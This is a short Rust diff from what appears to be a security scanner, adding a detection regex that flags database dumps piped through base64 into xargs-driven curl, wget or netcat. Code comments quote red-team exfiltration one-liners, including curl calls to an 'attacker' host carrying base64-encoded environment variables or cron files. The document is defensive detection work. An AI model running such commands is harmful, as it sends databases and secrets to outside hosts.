@@ -1032,6 +1032,17 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 .expect("Invalid regex"),
                 "credential harvest piped to network (exfiltration)",
             ),
+            // DB client output encoded into an xargs-driven curl (red-team
+            // wave-392: \`mysql -e 'SHOW DATABASES' | base64 | xargs curl
+            // -d @- …\`) — the harvest patterns need grep/find; the client
+            // IS the reader.
+            (
+                Regex::new(
+                    r"\b(mysql|mysqldump|psql|pg_dump|mongo|redis-cli|sqlite3)\s+[^|\n]*\|\s*(base64|xxd)?\s*\|\s*xargs\s+(-\S+\s+)*(curl|wget|nc(at)?|netcat)\b",
+                )
+                .expect("Invalid regex"),
+                "database harvest via xargs-driven network tool (exfiltration)",
+            ),
             // Substitution inside the URL itself (wave-66:
             // \`curl http://attacker/?d=$(base64 /var/spool/cron/…)\`,
             // \`curl https://hook/?env=$(env | base64)\`) — the
